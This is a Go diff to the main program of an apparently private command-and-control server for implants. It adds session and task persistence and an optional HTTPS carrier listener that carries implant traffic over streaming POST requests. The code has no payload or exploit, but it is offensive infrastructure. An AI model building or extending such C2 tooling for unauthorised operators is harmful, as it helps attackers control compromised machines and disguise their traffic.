@@ -16,6 +16,7 @@ import (
 	"github.com/azizbinmohammad/private-c2/server/api/httpapi"
 	"github.com/azizbinmohammad/private-c2/server/c2"
 	"github.com/azizbinmohammad/private-c2/server/store"
+	"github.com/azizbinmohammad/private-c2/server/store/repository"
 	"github.com/azizbinmohammad/private-c2/server/telemetry"
 )
 
@@ -23,6 +24,8 @@ func main() {
 	listenAddr := flag.String("listen", ":4444", "Implant TLS listener address")
 	apiAddr := flag.String("api", "127.0.0.1:8080", "Operator HTTP API address")
 	metricsAddr := flag.String("metrics-addr", ":9090", "Metrics/health listen address")
+	httpsListen := flag.String("https-listen", "", "HTTPS carrier listen address (empty = disabled)")
+	httpsPath := flag.String("https-path", "/api/c2", "HTTPS carrier request path")
 	certFile := flag.String("cert", "", "Server certificate PEM file")
 	keyFile := flag.String("key", "", "Server private key PEM file")
 	caFile := flag.String("ca", "", "CA certificate PEM for verifying implants (optional)")
@@ -55,6 +58,15 @@ func main() {
 
 	// --- Core C2 server ---
 	implantServer := c2.NewImplantServer()
+	persistence := c2.NewGORMPersistence(
+		repository.NewSessionRepository(db),
+		repository.NewTaskRepository(db),
+	)
+	// Sessions marked active from a previous process cannot still be live.
+	if err := persistence.MarkLiveSessionsDisconnected(context.Background()); err != nil {
+		log.Printf("Failed to reconcile previous sessions: %v", err)
+	}
+	implantServer.SetPersistence(persistence)
 
 	// --- TLS listener for implants ---
 	//
@@ -81,6 +93,28 @@ func main() {
 		log.Fatalf("Failed to start implant listener: %v", err)
 	}
 	log.Printf("Implant TLS listener on %s", net.JoinHostPort(defaultListener.BindAddr, strconv.Itoa(defaultListener.Port)))
+
+	// --- Optional HTTPS carrier (same framed protocol over a streaming POST) ---
+	var httpsServer *http.Server
+	if *httpsListen != "" {
+		path := *httpsPath
+		if path == "" {
+			path = "/api/c2"
+		}
+		carrierMux := http.NewServeMux()
+		carrierMux.HandleFunc(path, implantServer.HTTPSStreamHandler())
+		httpsServer = &http.Server{
+			Addr:      *httpsListen,
+			Handler:   carrierMux,
+			TLSConfig: tlsConfig,
+		}
+		go func() {
+			log.Printf("HTTPS carrier on https://%s%s", *httpsListen, path)
+			if err := httpsServer.ListenAndServeTLS("", ""); err != nil && err != http.ErrServerClosed {
+				log.Printf("HTTPS carrier error: %v", err)
+			}
+		}()
+	}
 
 	// --- Operator HTTP API ---
 	apiRouter := httpapi.NewRouter(implantServer, db, tlsConfig)
@@ -132,6 +166,9 @@ func main() {
 	defer cancel()
 	apiServer.Shutdown(ctx)
 	metricsServer.Shutdown(ctx)
+	if httpsServer != nil {
+		httpsServer.Shutdown(ctx)
+	}
 
 	log.Println("Server stopped")
 }
